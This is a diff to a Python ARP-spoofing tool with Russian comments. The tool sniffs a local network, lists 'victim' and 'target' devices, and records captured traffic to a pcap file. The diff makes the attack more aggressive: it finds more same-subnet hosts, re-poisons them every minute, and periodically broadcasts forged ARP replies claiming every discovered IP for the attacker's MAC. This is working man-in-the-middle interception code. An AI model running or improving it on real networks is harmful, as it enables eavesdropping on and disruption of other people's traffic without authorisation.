@@ -98,6 +98,19 @@ def sniff_and_find_new_devices(interface="eth0", queue=None, pcap_name="captured
                 # Добавляем устройство в очередь
                 queue.put((victim_ip, victim_mac))
                 queue.put((target_ip, target_mac))
+        elif packet.haslayer(IP):
+            victim_ip = packet[IP].src if packet.haslayer(IP) else packet[ARP].psrc
+            victim_mac = packet[ARP].hwsrc if packet.haslayer(ARP) else packet[Ether].src
+
+            target_ip = packet[IP].dst if packet.haslayer(IP) else packet[ARP].pdst
+            target_mac = packet[ARP].hwdst if packet.haslayer(ARP) else packet[Ether].dst
+
+            # Проверяем, является ли устройство новым
+            if str(target_ip).rpartition(".")[0] == str(victim_ip).rpartition(".")[0]:
+                if target_ip not in queue.queue:
+                    # Добавляем устройство в очередь
+                    queue.put((victim_ip, victim_mac))
+                    queue.put((target_ip, target_mac))
 
         # Записываем пакет в pcap файл
         pktdump.write(packet)
@@ -214,6 +227,8 @@ def main():
 
     args = parser.parse_args()
 
+    renew_arp_spoof_time = 120 # количество секунд до переотправки в эфир подделки собой всех найденных локальных ip (по желанию может быть вынесено в атрибуты командной строки)
+
     # Получаем параметры из командной строки
     interface = args.interface
     spoof_ip = get_if_addr(interface)
@@ -245,6 +260,7 @@ def main():
     # Словарь для хранения времени последней ARP-подделки для каждого устройства
     last_spoof_time = {}
     old_list = []
+    global_resend_time = 0
 
     if not quiet_mode:
         if gateway_ip != "":
@@ -275,10 +291,15 @@ def main():
                     last_spoof_time[target_ip] = time.time()
                 else:
                     # Проверяем время последней ARP-подделки для этого устройства
-                    if target_ip in last_spoof_time and time.time() - last_spoof_time[target_ip] >= 300:
-                        # Отправляем ARP-подделку, если прошло более 5 минут
+                    if target_ip in last_spoof_time and time.time() - last_spoof_time[target_ip] >= 60:
+                        # Отправляем ARP-подделку, если прошло более 1 минут
                         arp_spoof(spoof_mac, victim_ip, victim_mac, target_ip, target_mac)
                         last_spoof_time[target_ip] = time.time()
+                    elif not quiet_mode and time.time() - global_resend_time >= renew_arp_spoof_time:
+                        # Переотправка в эфир подделки собой всех найденных локальных ip
+                        for i in range(len(old_list)):
+                            arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=old_list[i], hwsrc=spoof_mac, hwdst="ff:ff:ff:ff:ff:ff")
+                            sendp(arp_packet, verbose=0, count=3)
         except Empty:
             # Ожидаем новые данные
             pass
